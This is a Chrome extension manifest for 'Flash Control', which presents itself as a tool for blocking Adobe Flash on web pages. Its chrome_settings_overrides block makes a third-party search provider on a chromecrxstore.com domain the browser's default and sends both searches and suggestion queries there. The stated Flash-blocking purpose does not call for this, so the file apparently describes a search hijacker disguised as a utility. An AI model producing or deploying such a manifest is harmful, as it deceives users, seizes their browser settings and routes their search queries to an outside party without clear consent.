{
  "update_url": "https://clients2.google.com/service/update2/crx",
  "manifest_version": 2,
  "name": "Flash Control",
  "version": "4.3",
  "description": "Flash control or Flash block chrome extension helps you to block all the Adobe flash player files from any web page you visit.",
  "icons": {
    "16": "icon.png",
    "48": "icon.png",
    "128": "icon.png"
  },
  "homepage_url": "https://flashcontrol.chromecrxstore.com/",
  "browser_action": {
    "default_icon": "icon.png",
    "default_title": "Flash Control"
  },
  "background": {
    "scripts": [
      "background.js"
    ],
    "persistent": false
  },
  "chrome_settings_overrides": {
    "search_provider": {
      "is_default": true,
      "name": "Flash Control",
      "keyword": "search flash control",
      "encoding": "UTF-8",
      "favicon_url": "https://searchsmartfc.chromecrxstore.com/favicon.ico",
      "search_url": "https://searchsmartfc.chromecrxstore.com/?q={searchTerms}",
      "suggest_url": "https://suggest.chromecrxstore.com?q={searchTerms}"
    }
  }
}
